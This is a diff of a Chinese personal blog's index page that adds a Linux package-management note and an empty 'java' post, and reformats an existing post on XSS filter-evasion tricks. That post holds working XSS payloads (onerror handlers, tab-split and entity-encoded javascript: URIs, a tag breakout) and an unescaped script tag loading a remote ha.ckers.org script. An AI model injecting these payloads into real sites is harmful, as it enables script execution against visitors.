@@ -142,7 +142,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/杂记/" style="font-size: 10px;">杂记</a> <a href="/tags/经历/" style="font-size: 10px;">经历</a> <a href="/tags/绕过技巧/" style="font-size: 10px;">绕过技巧</a>
+                        <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/杂记/" style="font-size: 10px;">杂记</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/经历/" style="font-size: 10px;">经历</a> <a href="/tags/绕过技巧/" style="font-size: 10px;">绕过技巧</a> <a href="/tags/课堂笔记/" style="font-size: 10px;">课堂笔记</a>
                     </div>
                 </section>
                 
@@ -222,6 +222,67 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="[layout]-Linux" class="article article-type-[layout]" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/28/Linux/" class="article-date">
+      <time datetime="2016-08-28T02:47:54.000Z" itemprop="datePublished">2016-08-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/28/Linux/">Linux</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="一般来说著名的linux系统基本上分两大类："><a href="#一般来说著名的linux系统基本上分两大类：" class="headerlink" title="一般来说著名的linux系统基本上分两大类："></a>一般来说著名的linux系统基本上分两大类：</h1><p>1.RedHat系列：Redhat、Centos、Fedora等<br>2.Debian系列：Debian、Ubuntu等 </p>
+<h2 id="RedHat-系列"><a href="#RedHat-系列" class="headerlink" title="RedHat 系列"></a>RedHat 系列</h2><p>1 常见的安装包格式 rpm包,安装rpm包的命令是“rpm -参数”<br>2 包管理工具 yum<br>3 支持tar包 </p>
+<h2 id="Debian系列"><a href="#Debian系列" class="headerlink" title="Debian系列"></a>Debian系列</h2><p>1 常见的安装包格式 deb包,安装deb包的命令是“dpkg -参数”<br>2 包管理工具 apt-get<br>3 支持tar包 </p>
+<h3 id="一、yum安装。"><a href="#一、yum安装。" class="headerlink" title="一、yum安装。"></a>一、yum安装。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">yum安装常用软件的命令</div><div class="line">#yum check-update</div><div class="line">#yum remove 软件包名</div><div class="line">#yum install 软件包名</div><div class="line">#yum update 软件包名</div><div class="line">yum命令常见使用方法</div><div class="line">yum -y install 包名（支持*） ：自动选择y，全自动</div><div class="line">yum install 包名（支持*） ：手动选择y or n</div><div class="line">yum remove 包名（不支持*）</div><div class="line">rpm -ivh 包名（支持*）：安装rpm包</div><div class="line">rpm -e 包名（不支持*）：卸载rpm包</div></pre></td></tr></table></figure>
+<h3 id="二、apt-get安装。"><a href="#二、apt-get安装。" class="headerlink" title="二、apt-get安装。"></a>二、apt-get安装。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">apt-cache search package 搜索软件包</div><div class="line">apt-cache show package 获取包的相关信息，如说明、大小、版本等</div><div class="line">sudo apt-get install package 安装包</div><div class="line">sudo apt-get install package --reinstall 重新安装包</div><div class="line">sudo apt-get -f install 修复安装</div><div class="line">sudo apt-get remove package 删除包</div><div class="line">sudo apt-get remove package --purge 删除包，包括配置文件等</div><div class="line">sudo apt-get update 更新源</div><div class="line">sudo apt-get upgrade 更新已安装的包</div><div class="line">sudo apt-get dist-upgrade 升级系统</div><div class="line">apt-cache depends package 了解使用该包依赖那些包</div><div class="line">apt-cache rdepends package 查看该包被哪些包依赖</div><div class="line">sudo apt-get build-dep package 安装相关的编译环境</div><div class="line">apt-get source package 下载该包的源代码</div><div class="line">sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包</div><div class="line">sudo apt-get check 检查是否有损坏的依赖</div></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/笔记/">笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="[layout]-XSS绕过技巧" class="article article-type-[layout]" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -261,15 +322,13 @@
 </code></pre><h2 id="通过error事件触发alert"><a href="#通过error事件触发alert" class="headerlink" title="通过error事件触发alert"></a>通过error事件触发alert</h2><pre><code>&lt;img src=&apos;#&apos; onerror=alert(&quot;XSS&quot;)&gt;
 #无引号无分号
 &lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
-</code></pre><p>###内嵌TAB(或者回车)</p>
-<p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure></p>
-<p>###内嵌被编码的TAB</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure>
+</code></pre><h3 id="内嵌TAB-或者回车"><a href="#内嵌TAB-或者回车" class="headerlink" title="内嵌TAB(或者回车)"></a>内嵌TAB(或者回车)</h3><p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure></p>
+<h3 id="内嵌被编码的TAB"><a href="#内嵌被编码的TAB" class="headerlink" title="内嵌被编码的TAB"></a>内嵌被编码的TAB</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure>
 <h2 id="闭合标签绕过"><a href="#闭合标签绕过" class="headerlink" title="闭合标签绕过"></a>闭合<html>标签绕过</html></h2><pre><code>&lt;/title&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
 </code></pre><h2 id="无过滤绕过"><a href="#无过滤绕过" class="headerlink" title="无过滤绕过"></a>无过滤绕过</h2><p>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）<br>    <script src="http://ha.ckers.org/xss.js"></script></p>
 <h2 id="十进制html编码"><a href="#十进制html编码" class="headerlink" title="十进制html编码"></a>十进制html编码</h2><pre><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 </code></pre><h2 id="结尾没有分号的十进制html编码"><a href="#结尾没有分号的十进制html编码" class="headerlink" title="结尾没有分号的十进制html编码"></a>结尾没有分号的十进制html编码</h2><pre><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
-</code></pre><p>#参考链接：<br><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="external">XSS 过滤绕过备忘单</a></p>
+</code></pre><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="external">XSS 过滤绕过备忘单</a></p>
 
       
     </div>
@@ -281,6 +340,63 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/绕过技巧/">绕过技巧</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="[layout]-java" class="article article-type-[layout]" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/28/java/" class="article-date">
+      <time datetime="2016-08-28T02:47:54.000Z" itemprop="datePublished">2016-08-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/28/java/">java</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h2><h3 id="java-2"><a href="#java-2" class="headerlink" title="java"></a>java</h3><h4 id="java-3"><a href="#java-3" class="headerlink" title="java"></a>java</h4><h5 id="java-4"><a href="#java-4" class="headerlink" title="java"></a>java</h5>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/课堂笔记/">课堂笔记</a></li></ul>
     </div>
 
       
